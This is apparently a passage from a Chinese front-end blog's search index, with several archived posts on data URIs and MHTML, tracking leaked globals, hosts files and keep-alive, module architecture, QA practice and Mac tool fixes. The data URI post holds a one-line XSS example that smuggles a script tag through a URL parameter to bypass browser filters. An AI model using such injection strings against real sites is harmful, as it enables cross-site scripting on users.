编码可以让内容变得更加简短。而对图片来说，在 gzip 压缩之后，base64 图片实际上比原图 gzip 压缩要大，体积增加大约为三分之一，所以使用的时候需要权衡。兼容性由于出现时间较早，目前主流的浏览器基本都支持 data URI：Firefox 2+Opera 7.2+Chrome (所有版本)Safari (所有版本)Internet Explorer 8+但是部分浏览器对 data URI 的使用存在限制：长度限制，长度超长，在一些应用下会导致内存溢出，程序崩溃12Opera 下限制为 4100 个字符，目前已经去掉了这个限制IE 8+ 下限制为 32,768 个字符（32kb），IE9 之后移除了这个限制在 IE 下，data URI 只允许被用到如下地方：object (images only)img、input type=image、linkCSS 中允许使用 URL 声明的地方,如 background在 IE 下，Data URI 的内容必须是经过编码转换的，如 “#”、”%”、非 US-ASCII 字符、多字节字符等，必须经过编码转换低版本IE的解决之道 - MHTMLMHTML 就是 MIME HTML，是 “Multipurpose Internet Mail Extensions HyperText Markup Language” 的简称，它就像一个带着附件的邮件一般，如下所示：12345678910111213141516/** FilePath: http://example.com/test.css *//*!@ignoreContent-Type: multipart/related; boundary=&quot;_ANY_SEPARATOR&quot;--_ANY_SEPARATORContent-Location:myidBackgroundContent-Transfer-Encoding:base64iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==--_ANY_SEPARATOR--*/.myid &#123; background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==&quot;); *background-image: url(mhtml:http://example.com/test.css!myidBackground);&#125;上方的一串注释就像是一个附件，这个附件内容是一个名叫 myidBackground 的 base64 编码图片，在一个 class 叫做 myid 的 css 中用到了它。这里有几点需要注意：_ANY_SEPARATOR 可以是任意内容在”附件”结束位置需要加上结束符 _ANY_SEPARATOR，否则在 Vista 和 Win7 的 IE7 中会出错。附件代码注意不要被压缩工具给干掉了这里存在一个坑：部分系统兼容模式下的 IE8 也认识 css 中的 hack 符号 *，但是不支持 mhtml，所以上面的内容不会生效。处理方案估计就只有使用 IE 的条件注释了。HTTPS 下的安全提示HTTPS 打开页面，当在 IE6、7 下使用 data URIs 时，会看到如下提醒：MS 的解释是：您正在查看的网站是个安全网站。它使用了 SSL （安全套接字层）或 PCT（保密通讯技术）这样的安全协议来确保您所收发信息的安全性。当站点使用安全协议时，您提供的信息例如姓名或信用卡号码等都经过加密，其他人无法读取。然而，这个网页同时包含未使用该安全协议的项目。 很明显，IE 嗅到了”未使用安全协议的项目”。浏览器在解析到一个 URI 的时候，会首先判断协议头，如果是以 http(s) 开头，它便会建立一个网络链接下载资源，如果它发现协议头为 data:，便会将其作为一个 Data URI 资源进行解析。但是从 chrome 的瀑布流，我们可以做这样的猜测：图中每个 Data URI 都发起了请求，不过状态都是 data(from cache)，禁用缓存之后，依然如此。所以可以断定，浏览器在下载源码解析成 DOM 的时候，会将 Data URI 的资源解析出来，并缓存在本地，最后 Data URI 每个对应位置都会发起一次请求，只是这个请求还未建立链接，就被发现存在缓存的浏览器给拍死了。安全阀门Data URI 在 IE 下有诸多安全限制，事实上，很多 xss 注入也可以将 data URI 的源头作为入口，使用 data URI 绕过浏览器的过滤。12// 绕过浏览器过滤http://example.com/text.php?t=&quot;&gt;&lt;script src=&quot;data:text/html,&lt;script&gt;alert(&quot; xss&quot;)&lt;=&quot;&quot; script=&quot;&quot;&gt;&lt;!--这里可以很大程度的发散，很有意思，值得读者去深究。扩展阅读RFC 2397 RFC文档MDN - data_URIs MDN文档MSDN - data Protocal MSDN文档NC - data_uris_explainedphpied - MHTML]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何快速定位不小心暴露到全局的变量]]></title>
    <url>%2Fblog%2F2015%2F07%2F09%2F2015-07-09-cb-window-var%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 今天在查看页面控制台的时候，无意中看到了一个暴露到全局的变量 i，全局变量是不会被压缩工具压缩成简写的字母，这个被频繁使用的变量名暴露到全局也是个相当大的隐患，可能一个不小心就覆盖了第二次暴露到全局的同名变量。刚开始我就怀疑是自己出现了这样愚蠢的错误： 123456789101112function A() &#123; // 在一个函数中多次用到了 for 循环，为了节省变量，都是用了变量 i for(var i = 0; ...) &#123; //... &#125; for(i = 0; ...) &#123; //... &#125; for(i = 0; ...) &#123; //... &#125;&#125; 结果在某次拆分函数的时候，忘记定义: 12345678910111213function A()&#123; for(var i = 0; ...) &#123; //... &#125; for(i = 0; ...) &#123; //... &#125;&#125;function B()&#123; for(i = 0; ...) &#123; //... &#125;&#125; 这个时候，变量 i 在 B 函数执行的时候就暴露到了全局。抱着这样的怀疑，我搜索了 50 多个模块的代码，一无所获…此时，我依然十分怀疑是自己的程序哪里疏忽了，全局搜索 i = 和 i++，五分钟过去了，未果…找到这个变量如果这个变量名叫做 fuckIE，分分钟全局搜索就出来了，类似这种简短的常用的变量，着实让人头疼了好一会儿。后来想到了这个方案： 123456Object.defineProperty(window, &quot;i&quot;, &#123; get : function()&#123; return window.i; &#125;, set : function(newValue)&#123; debugger;window.i = newValue; &#125;, enumerable : true, configurable : true&#125;); 在全局定义变量 i 的时刻，打一个断点，然后 F10 往前走一步，果然，在控制台右侧的 Call Stack 中找到了端倪！这个变量是从第三方组件中（offline组件，使用相当频繁的一个组件）暴露出来的，估计出错的方式同我上面的描述差不多，拆分函数的时候忘记重新定义变量 i。当然还有更快的方式： 1window.__defineSetter__(&apos;i&apos;, function()&#123; debugger &#125;) 不挖坑才是最好的解决方案 1. 使用 use strict;在严格模式下，这种问题暴露无遗，每个函数内都加上 use strict;，虽然在语言上有所限制，但是低级错误一定不会出现，因为严格模式会给你报错！2. 使用 jslint/jshint 等 js 分析工具这些东西除了配置上较为繁琐，用起来还是很顺手的，做过配置的错误都会直接在 IDE 上标红显示出来，很容易发现问题，但是不建议一个项目中途使用，因为代码习惯的问题，很多地方被 js 分析工具作为错误抛出来，改动量是相当大的。我有次也犯了个比较隐晦的错误： 123456$(window).on(&apos;click&apos;, function(evt)&#123; var target = event.target.nodeName.toLowerCase(); if(target !== &apos;ul&apos;)&#123; //... &#125;&#125;); 在 IE 和 Chrome 下，代码跑得好好的，但是到了测试较少的 FF 下，问题出来了，event is not defined.，IE 和 Chrome 是支持 window.event 抓取当前事件对象的，而 FF 不支持，所以每次点击页面上都会报错。。。诸如此类的问题，在我们的平时编码之中不胜枚举，所以有一个编码规范作为强约束是十分有必要的！]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无题]]></title>
    <url>%2Fblog%2F2015%2F05%2F30%2F2015-05-30-%E6%97%A0%E9%A2%98%2F</url>
    <content type="text"><![CDATA[再过几天，又一波高三的学生就要走进人生的考场了，这一战一定程度决定了未来的发展，祝好！ 五年前，我也像你们一样，忐忑地等待着这一战的到来，十年磨一剑，期盼有一个好看的分数，也能对得起自己付出的努力。但是现实是残酷的，我记得一个数字，中国的大学有 9000 多所，“好大学”有 200 多所，所以到最后 45 个人中只能有一个人“脱颖而出”，剩下的人被分配到的教学资源相对较少。 高考，就是一个若隐若现的台阶，看见了，你就往上踏了一步，路需要接着走；看不见，脚步依旧不会停息。高考给我的烙印是一个好看的数字：632，仅此而已，因为这个数字，我多了一些更好的选择。对其他人也是一样的，不同的数字通往不同的路，在路上看到不同的风景。而四年之后，似乎也并不是路的终点，它又成了一个让人倍感不安的起点。 大学出来，已经快一年了。我好像比较喜欢用“出来”这个词来形容毕业，生活有的时候就像一个一个的笼子，从高中被放出来之后，又被装进了大学，大学毕业之后，就被装进了社会，似乎只有童年的无知是美好的。 人活着需要一个长远的目标。 一些组织、团体在动员组员做事之前，都会放出一个口号，树立一个标杆。活着也是一样，没有一个方向，就会瞎窜，走在路上，发现自己偏离了轨道，然后伫足反思，接着继续瞎窜。好多人都是这样。 （未完，P.S. 今天骑电驴摔了，好惨…）]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改Hosts为何不生效，是DNS缓存？]]></title>
    <url>%2Fblog%2F2015%2F05%2F11%2F2015-05-11-cb-hosts-modify%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. Update:如果浏览器使用了代理工具，修改 Hosts 也不会生效。这里是因为，浏览器会优先考虑代理工具（如添加 pac 文件、SwitchySharp等）的代理，建议调试的时候先关闭这些代理。使用 pac 文件代理有的时候部分文件的代理不生效，应该是 pac 对应的代理服务器上，做了部分处理。部分浏览器也有 DNS 缓存，如 chrome(chrome://dns)，这是为什么重启浏览器也不生效的原因，一般设定时间为 60s (如 Firefox)。浏览器有DNS缓存，系统也会存在 DNS 缓存，有的时候即便在 chrome://dns 清空了浏览器 DNS 缓存，依然不生效，是因为系统 DNS 缓存还未刷新，刷新方式可以看这篇文章。&nbsp;相信很多同学都在使用 SwitchHosts/iHosts/Gas Mask 等 Hosts 管理工具，当然也有人直接修改 /etc/hosts 或者 system32/drivers/etc/hosts 文件，而经常遇到的疑问是：咿，刚才不是修改并且保存了么，为何 Chrome 浏览器还不生效呢？有人说重启下浏览器就好了，有人说清空下缓存 DNS（chrome://net-internals/#DNS）就好了，有人说隐私模式下打开就好了，有人说等一分钟吧…结果就是，进入隐私模式的都好了，重启、清空缓存DNS和等一分钟的同学还在继续纠结中。。。上面提到的三个工具，SwitchHosts/iHosts/Gas Mask，其实也只有 iHosts 生效了(Mac下)。开发过程中我们会无数次的切换 Hosts，如果不知道原理，我们在测试的时候还是很心惊胆战的=_=||修改Hosts不生效的根本原因因为服务器设置了 keep-alive ！次要原因是存在浏览器 DNS 缓存和系统 DNS 缓存。&gt; Keep-alive 相关文档服务器在响应头设置了 Connection: keep-alive （一般的网页都会设置 keep-alive，保持长连接，避免多次连接产生网络消耗）之后，客户端会跟服务器保持长连接，只要长连接不断开，页面在请求的时候就不会重新解析域名！我们可以这样来测试：打开一个你至少两分钟没有打开的浏览器（你也可以关闭掉你的浏览器，然后重新打开，记得把所有的 tab 都关了，除了当前 tab ^_^）在 hosts 添加 127.0.0.1 www.taobao.com新开 tab，打开 www.taobao.com，是不是进不去了 &lt;这里说明 hosts 修改生效了&gt;注释掉刚才hosts修改，# 127.0.0.1 www.taobao.com ，再打开 www.taobao.com，很好，正常打开了 &lt;这里说明 hosts 修改也生效了&gt;去掉注释符，127.0.0.1 www.taobao.com ，再打开 www.taobao.com，依然可以访问！！！Chrome 中进入 chrome://net-internals/#sockets，，可以看到淘宝首页中很多域名都是与服务器保持着长连接，点击上方的 close idle sockets 按钮，可以关闭所有的长连接此时，再去访问 www.taobao.com，是不是进不去了！为何一些修改可以让 “Hosts 生效”1. 重启浏览器重启浏览器之后，所有的连接（包括长连接）都会断开，自然就生效了2. 隐私模式打开因为隐私模式下不会复用 TCP 连接，新开连接的时候，会重新解析 DNS 域名，自然也生效了3. iHosts 管理器在 Mac 下生效因为我在 Windows 下测试过，貌似没有立即生效。问了 iHosts 的作者@必隆，他告诉我，在修改 hosts 文件的时候，会重启网络服务，这个时候必然会断开所有的 TCP 连接（重启网络服务，差不多相当于先断网再联网…)4. 修改之后，等一会儿…“等一会儿”，要稍微等久一点，keep-alive 的默认设置是 120s，开发者也有可能增大或者减小这个配置，所以”等一会儿”也是很伤神的=。 =看到这里，你对其中的原理是否有所了解了呢？]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>hosts</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端工程架构探讨]]></title>
    <url>%2Fblog%2F2015%2F05%2F03%2F2015-05-03-cb-fe-project%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 回忆一下我们在工程开发中对目录结构的定义，一般分为两种，单页面多模块，多页面多模块。在单页面多模块的工程结构里，我们会考虑模块的复用性，比如：如何将公共的东西（样式、函数等）提取出来方便其他模块复用。在多页面多模块的场景中，也是一样，不过除了把全局共用的样式和方法提取到公共目录外，我们还会将多个地方都会用到的模块作为通用模块处理。 一、通常开发模式的问题探讨下图是一个单页面多模块的工程目录结构图： 1234567891011121314151617.├── Gruntfile.js├── package.json├── build└── src ├── base │ ├── base.sass │ └── global.js ├── mods │ ├── preference │ │ ├── index.js │ │ ├── index.sass │ │ └── index.xtpl.html │ ├── promo │ ├── qr │ └── response └── index.js 我们把源码放在 src 文件夹里面，公共的文件（iconfont 、sprite 图片、CSS 和 JS 等）放到 base 目录下，页面中的每个模块都会在 mods 下新建一个文件夹，使用 index.js 来管理模块的渲染。 1234567891011121314151617// index.jsdefine(function(require)&#123; var Lazyload = require('lazyload'); var Preference = require('./mods/preference/index'); var Qr = require('./mods/qr/index'); var Promo = require('./mods/promo/index'); var Response = require('./mods/response/index'); new Response(); if(xxx)&#123; new Promo(); &#125; Lazyload(function()&#123; new Qr(); new Preference(); &#125;);&#125;); 这样的工程结构是十分通用，结构也比较清晰的，不过在模块的管理上，这里会存在两个问题： AB模块存在较多的共用代码，我们有两种方式处理，一是将公共部分提取出来放到 base 目录下，二是 B 模块直接根据相对路径引用 A 模块。一旦业务上有需求，说 A 模块要下线，那下线之后，第一种方案放置在 base 目录下的代码就不合理了，第二种方案中 B 模块就不能用了，需要将 A 模块的东西部分迁移到 B 模块。 问题 1 的逆过程：线上目前存在 A 模块，业务上需求需要添加跟 A 模块相似的 B 模块，如果想直接复用 A 模块的代码，一种方式是更小颗粒地分拆 A 模块，然后 B 使用相对路径引用 A，另一种方式是将 A 的共用代码提取出来放到 base 下。两种处理方式都有一定的工作量，而且还会出现问题 1 提到的问题。 其实说到底还是模块的耦合度过高，只要模块之间存在交集，一个模块的改动就可能会影响到其他模块。多人开发中，这里还存在其他方面的问题： 并不是每个开发者对接手的项目都有一个全局的把控，下线一个模块时，会不太敢删除 base 目录下跟该模块相关的东西，甚至都不太敢删除这个模块，只是在 index.js 中注释了这个模块的初始化。日积月累，冗余代码便会渗入到项目的各个地方… 修改一个模块需要编译打包所有的代码，这样的调试效率十分低下，而且这个模块出错，就可能造成整个程序的崩溃。 代码历史版本管理的颗粒度不够，比如我修改了 A、B、C 三个模块，依次上线了三次，现在要回滚修改 A 的操作，如何处理？如果 ABC 三个模块都能够利用代码管理工具管理代码，那回滚就方便多了。 二、模块化处理去耦合的方式就是让模块之间共用的东西减少，当模块之间不存在共用内容时，耦合度基本就是零了。 1234567891011.├── init.js├── build└── src ├── preference &lt;git&gt; │ ├── index.js │ ├── index.sass │ └── index.xtpl.html ├── promo &lt;git&gt; ├── qr &lt;git&gt; └── response &lt;git&gt; 如上图所示，与之前的结构相比，已经少了很多东西： index.js 初始化模块的东西不见了，多了一个 init.js base 目录不见了 每个模块都变成了一个 git 仓库 1. 脚本的初始化先看看 init.js 在干啥： 1234567891011121314151617181920// init.jsvar $mods = $("[tb-mods]");$mods.each(functon($mod)&#123; if($mod.attr("finish") !== FINISH_TAG) &#123; $mod.attr("finish", FINISH_TAG); // 需要懒加载便懒加载 if($mod.attr("lazyload"))&#123; Lazyload($mod); return; &#125; // 否则直接初始化 S.use($mod.attr("path"), function(S, Mod)&#123; new Mod($mod); &#125;); &#125;&#125;);function Lazyload()&#123; // code here..&#125; init.js 不再对模块进行精确初始化，文档从上往下遍历，找到模块便直接初始化，如果需要懒加载就加入到懒加载队列，开发者不用理会页面上有多少模块，更不用理会各个模块叫做什么名字。 index.js 中 require 很多很多模块，每次添加一个模块或者删除模块都要改动这个文件，而是用 init.js 不会存在这个问题。 2. 模块的版本控制12345&lt;!-- index.xtpl.html --&gt;&lt;div tb-mods="" lazyload="" path="tb/promo/1.0.0"&gt;&lt;/div&gt;&lt;div tb-mods="" lazyload="" path="tb/qr/2.0.0"&gt;&lt;/div&gt;&lt;div tb-mods="" lazyload="" path="tb/preference/2.2.1"&gt;&lt;/div&gt;&lt;div tb-mods="" path="tb/response/3.0.2"&gt;&lt;/div&gt; 页面上的 DOM 就是标识，存在 DOM 属性标识就执行这个标识对应的脚本，执行顺序就是 DOM 的摆放顺序。 每个模块代码都使用单个 git 仓库管理，这样能够更好地追踪单个模块的修改记录和版本，也可以解决上面提出的问题（依次修改 ABC 模块，并上线了三次，如果需要回滚 A 模块，则 BC 模块的修改也要跟着滚回去）。 3. ABTest 需求修改一个模块后，只需要修改他在 DOM 的版本号即可上线。如果遇到 ABTest 的需求，那也十分好办了： 12345678&lt;!-- index.xtpl.html --&gt;&#123;&#123;#if condition&#125;&#125;&lt;div tb-mods="" lazyload="" path="tb/promo/1.0.0"&gt;&lt;/div&gt;&#123;&#123;else&#125;&#125;&lt;div tb-mods="" path="tb/promo/2.0.0"&gt;&lt;/div&gt;&#123;&#123;/if&#125;&#125;&lt;div tb-mods="" lazyload="" path="tb/qr/2.0.0"&gt;&lt;/div&gt;&lt;div tb-mods="" path="tb/response/3.0.2"&gt;&lt;/div&gt; tb/promo 目前有两个版本，1.0.0 和 2.0.0，需求是两个版本以 50% 的概率出现，直接在 index.xtpl.html 做如上修改，程序是十分清晰的。 4. 公共文件的处理那么，公共的代码跑哪里去了？其实我们并不希望有公共的代码产生，上一节中已经提出了耦合给我们带来的维护问题，但是一个项目中必然会有大量可复用的东西，尤其是当页面出现很多相似模块的时候。 1）模块的复用 一个模块的渲染，需要两样东西，渲染壳子（模板） + 数据，渲染的壳子可能是一样的，只是数据源不一样，很多情况下我们可以复用一套 CSS 和 JS 代码，通过下面的方式： 123&lt;!-- index.xtpl.html --&gt;&lt;div tb-mods="" lazyload="" path="tb/promo/1.0.0" source="data/st/json/v2"&gt;&lt;/div&gt;&lt;div tb-mods="" lazyload="" path="tb/promo/1.0.0" source="data/wt/json/v1"&gt;&lt;/div&gt; 在两个相似模块中，我们使用的是同一套 js - tb/promo/1.0.0，但是使用了两个不同的数据源 data/st/json/v2, data/wt/json/v1。 1234567891011// init.js$mods.each(functon($mod)&#123; if($mod.attr("finish") !== FINISH_TAG) &#123; //... S.use($mod.attr("path"), function(S, Mod)&#123; // 将数据源传入 new Mod($mod, $mod.attr("source")); &#125;); //... &#125;&#125;); 在初始化脚本中，我们将模块需要用到的数据源传入到模块初始化程序中，这样页面就成功的复用了 tb/promo/1.0.0 的资源。 2）CSS 的复用问题使用 less 的 mixin 处理 12345678910@a: red;@b: white;.s1()&#123; color: @a; background: @b;&#125;.s2 &#123; color: @a; background: @b;&#125; LESS 是 CSS 的预处理语言，上面的代码打包之后，.s1 是不存在的，只有 .s2 会被打包出来，但是两者都可以 mixin 到其他类中： 1234.s &#123; .s1; .s2;&#125; 利用这个特点，我们可以把共用的 css 都包装成类似 .s1 的 less 代码，模块中需要的时候就 mixin，不需要的话，放在那里也没关系，不会造成代码冗余。 3）JavaScript 的代码复用问题 页面级别的 JS 代码其实并不多，比如我们平时用的比较频繁的有 Slide、Lazyload、Tab、Storage 等，但这些东西都是以组件的形式引入到页面中。仔细想一想，JS 中哪些代码是需要页面共用的？相对整个项目的文件大小，共用的部分又有多少？ 我们使用的基础库方法并不全面，比如：没有对 URL 解析的 unparam 方法，而这个方法用的也比较多，希望放到公共部分中去。回头想想，这样的小函数实现起来有啥难度么，三四行代码就能写出来的东西，建议放到组件内部搞定。这会造成一定的代码冗余，但是带来的解耦收益与费力写几行代码的成本相比，这完全是可以接受的。 页面共用的统计代码、错误收集代码、数据缓存方案、组件通讯代码等，这些量比较大、使用颇为频繁的内容，可以封装成组件，以组件形式引入进来。 这里还需要很多思考… 5. 模块之间的通讯模块之间的通讯最让人纠结的是，A 模块想跟 B 模块说话，但是 B 模块还没有初始化出来。所以我们需要引入一个中间人 S，每个模块初始化成功之后都去问一问 S，有没有人给我留言。 1234567891011// B 给 A 留言，如果 A 存在，则直接将 msg 发给 A// 如果不存在则送入 S 的消息队列S.tell("A", &#123; from : "B", msg: &#123;&#125;&#125;);// A 模块初始化的时候，获取其他模块的留言S.getMessage("A"， function(msg)&#123; // dosomething...&#125;); 三、小结还有很多东西不在主题的讨论范围内，就不一一列举出来了。 项目开发参与的人越多，代码就越难维护，约束只是一时的，编程方式、编码格式等的约束并不能从根本上解决问题，一旦约束的点未覆盖，结构就会开始散乱，最后必然又会迎来一次整体的重构。 方法和结果不能改变习惯，所以我们应该从模式出发。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对前端质量保障的思考]]></title>
    <url>%2Fblog%2F2015%2F04%2F24%2F2015-04-24-cb-Thinking-in-FE-Quality%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 我们时时在踩坑，有时也忍不住埋怨前人给我们留下了无数的坑，可回头想想，自己是不是也在挖坑等别人踩…上次听 赵海平 的讲座，他提到 Facebook 没有测试人员，以前和现在都没有，以后也不打算有。还提到上线之后就开发者坐在系统前等着，只要有bug，系统能够在五分钟之内检测到，并提供快捷方式修复。我惊叹的是他们能够在五分钟之内监控到所有的问题，实时回馈并及时修复。当然在探讨质量保障这个话题前，我们需要明确几个关键点：编码前、提交代码、测试、上线、回滚、上线后。针对这几个点，下面我谈一谈我的看法。一、编码前上家公司实习期间印象最深的交流是参与编码规范讨论，当时我还呼呼的整理了两份文档：前端编码规范之JavaScript,前端编码规范之CSS。后来也看到团队在各种工具上添加控制和提示，如 Sublime Text 添加 jslint 配置，项目目录下添加 .jslint 配置，打包工具提示代码的不规范，强制修复等等。上面提到的代码规范主要是代码展现层面的规范，他可以让团队写出来的代码就跟一个模子刻出来似的，结构、命名、函数体大小等等很接近，看着很舒服。举几个例子说明他的重要性。1. 统一使用 UTF8 编码我平时开发都是使用的 UTF8 编码。有次从仓库拉下来发现很多文件都是 GBK 编码，修改时一个文件忘记转换编码，提交发现 锟斤拷 出来了。2. TAB 缩进我比较喜欢使用四个空格作为 TAB 缩进。一次多人开发的时，发现同事的代码是两个空格的缩进，结果，我改成了四个空格提交之后，又被改回来两个空格，然后我接着改回去…3. 加不加分号以前写过一篇文章，谈了下自己对分号的看法：Javascript分号，加还是不加？，我的回答是加但非必须。代码的规范，对程序本身的意义并不是很大，他不会作用在程序的逻辑上，作用点在于团队合作。一个项目可能是多人开发，也可能是今天我开发，明天托付给你。如果两个人在编码习惯上的差异很大，就会偏头痛…有一点需要特别提出来，就是写注释！某次排查一个线上问题，找到了问题所在的文件，但是文件中的逻辑实在是太过复杂，四五百行代码仅三行注释，眼睛都看花了。其实只要在大段的代码前加几句注释，说明本段代码的大意，在排查定位问题的时候就可以忽略一部分代码块，可以为修复线上bug争取不少时间。二、提交代码这部分特指工具。可以说过了工具这一道关卡，代码基本就获得自由，bug 也就开始横飞了。目前工具可以为我们做的事情：1. 检测现在并没有做 jslint 之类的配置，所以代码的展示是没怎么规范的。编码应该统一为 UTF-8 格式，如果不是这种格式，工具应该有所提示。代码块过长提示，一个函数不应该写到几百上千行，拆分代码刚开始是辛苦，一旦后续复用的时候，就会很爽很爽了（当然，刚开始编码的时候就应该考虑一个函数的颗粒度控制）。更重要的是对语法的检测，我们可能把 document 拼写成了 doucment，甚至使用 for in 来遍历一个数组，这种问题时而出现，工具是否考虑帮助我们处理掉一些简单的愚蠢的错误。2. 压缩压缩代码的时候，我踩过坑：gulp打包压缩css遇到的坑，我相信很多人都认识 grunt 和 gulp，但是一定鲜有人自己配置过这些东西，并投入到项目中。代码的压缩，一方面可以减少线上流量，一方面也是出于安全的考虑。压缩后的代码线上报错很难定位到准确的位置，有些问题只能在用户的电脑上复现，”代理到本地这个法子”远程操作的时候是不靠谱的。压缩不仅仅应该把代码缩短，还要考虑线上排查问题的难度。在压缩的时候可以考虑添加空行，将网页错误定位范围缩减到单个文件。也可以使用 sourceMap 之类的辅助方式。在这篇文章中有过一些讨论。3. 合并很多事情，别人不考虑，工具就得考虑。这里有一个思考，HTTP2.0 支持多路复用，一个连接可以进行多次 HTTP 的传输，那以后的 sprite 图、文件的合并等是不是也应该重新考虑了。文件的全部合并真的是最省资源的方式么？是否可以考虑更多的合并方案？三、测试赵海平 说，技术实践中的三件套：功能 + 测试 + 监控。很多大公司的工程师，深谙功能开发之道，测试方面也能达到 60 分的水平，但是程序的监控上，做的很差，包括 Facebook 的程序员。三件套，对一个优秀的工程师来说，缺一不可。这里要说的是程序开发三板斧的第二板，测试。我们很自然地联想到了QA，阿里有一大波的测试人员。写完代码提测，好像剩下的就只是测试同学找BUG，我们等着修BUG。前端的测试跟后端还不太一样，逻辑可以测，但是 UI 效果、交互效果不好测，只能靠几双眼睛盯着看，几个鼠标不停地点点点。。。虽说逻辑可以通过写测试用例进行测试，会去写测试用例的人却不多。我记得当时学习 AOP 编程的时候，给 ajax 添加了一些 mock 功能，可以在页面上模拟请求测试效果(如jquery-mockjax)。编写测试用例确实可以解决很多的问题，但是如何培养编写测试用例的习惯，如何更加便利的测试我们的测试用例，这又是一个值得思考的话题。自动化工具一大缺点是很难捕获到特定环境下的错误。据统计，不管你的代码写得多健壮，在一千个用户下，总有那么一个用户，因为浏览器安装了插件、网络问题等导致代码报错，再比如我们在做灰度测试的时候，让用户名首字母为 a-m 的用户命中灰度时出现的错误等等，这些错误自动化测试工具是无法发现的。所以我们要把 错误日志统计 灵活地使用起来，他能够使你深入用户，拿到最原始的错误信息。四、上线现在涉及到前端上线的，有多个地方（公司有很多发布系统）：TMS发布aone2发布gitlab发布awp发布etc.gitlab发布通过域名严格区分测试、预发和线上环境，操作界限明确，出错的概率还是很低的（这要求开发者对 git 命令的操作十分熟练），如果几次 reset revert stash 之后便开始犯蒙，那出问题的概率就增大了。每次打下 tag 之前，我都会很仔细地 diff 下代码，看看本次发布和上次发布之间做了哪些修改，确认这些修改点再 push tag。aone2的发布，并不是每个人都用过，它的靠谱在于有三种发布方式：全网发布，半小时完成小淘宝环境灰度发布，两小时完成分三次发布，小流量上线，一天完成同时也提供了十分方便的回滚机制，只要拥有应用的权限，可以随时回滚代码，效率极高。TMS 的发布，我觉得是问题最多的。首先，前端和运营都会拥有发布权限，运营喜欢”瞎搞”，部分页面（如JSON输出）并没有提供页面预览，运营填完之后也不会跑到页面查看效果，于是就出问题了。。TMS发布每次修改只发布一个文件，CDN 发布一个文件的速度是很快的，当你点击发布的那个瞬间，整个同步就基本完成了。可是，当某个节点同步出错，TMS 并没有给出提示，这是第二个隐患。第三个点，TMS坑爹的没有灰度，对一些重要的发布，没有灰度就需要十分十分的谨慎，虽说出错可以及时回滚，但万一没有看到隐性的错误，那就悲惨了。五、回滚没人可以保证自己写的东西绝对不出问题，因为有太多的环境因素是我们想也想不到的，比如最近某类控件在小淘宝环境下全挂了，试问，前端怎么会想到这是Nginx 的灰度系统出问题了，在灰度发布的时候文件没有同步成功，导致整个灰度环境出错。所以，一定要给你的程序想一套快速回滚方案。尤其是在做 ABTest 的时候，新版的效果不好需要回滚到之前的状态，这种事情经常有。回滚需要注意两点：要快。上一个状态要保证无错误。只要我们能够保证发到线上的每一个版本都是稳定版，那回滚就是 0 风险的事情。六、监控程序开发三板斧的第三板，监控。前端对测试就不太重视，更不用提监控了。没有监控就只能提心吊胆的过日子。其实我们使用自动化工具测试、每天用肉眼顶着自己的页面看，这些都属于监控，但是深入到用户的监控，我们做的太少！七、小结看到老大在群里发了几条研发相关的红线：1、禁止代码未经测试发布;2、禁止代码发布后不进行线上验证;3、禁止核心应用发布没有对应的回滚方案。 毫无疑问，这些都是必须严格遵守的。规范会先把坏习惯压住，进而被理解，最后被消化吸收。前端质量保障之路，任重而道远！]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sublime text 3 没有node的build-system]]></title>
    <url>%2Fblog%2F2015%2F04%2F15%2F2015-04-15-st3-node-build-system%2F</url>
    <content type="text"><![CDATA[郁闷了好多次了，Mac 系统 Sublime Text 3，具体版本是 Stable Channel，Build 3083，没有 node 的 build-system，为了方便调试，每次都得把巨型的 webstrom 打开，今天摸索了下，找到了方案~ 首先安装下 Javascript &amp; Coffee Build System 的插件，这个时候 ST 会多出三个 Build-System，分别是 xjs xjs - Compile xjs - Harmony 使用 xjs 就可以运行 js 脚本，直接 Ctrl + B 可能会报错，说 1not found file or fold `node` 云云的错误。我们的 node 一般安装在 /usr/local/bin/node 这个地方。而环境变量，如果没有修改的话应该是这些： 1/usr/bin:/usr/sbin/:/bin:/sbin 你可以将 /usr/local/bin/node 加入到环境变量，也可以这样 1sudo ln -s /usr/local/bin/node /usr/bin/node OK，就这么愉快的搞定了，如果想以 harmony 方式运行，可以按下 Ctrl+Shift+B，选择 xjs - Harmony 就行了。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>ST3</tag>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xcode-select Error]]></title>
    <url>%2Fblog%2F2015%2F04%2F13%2F2015-04-13-xcode-select-error%2F</url>
    <content type="text"><![CDATA[错误信息： xcode-select: error: tool ‘xcodebuild’ requires Xcode, but active developer directory ‘/Library/Developer/CommandLineTools’ is a command line tools instance 解决方案： 1sudo xcode-select --switch /Applications/Xcode.app/Contents/Developer]]></content>
      <categories>
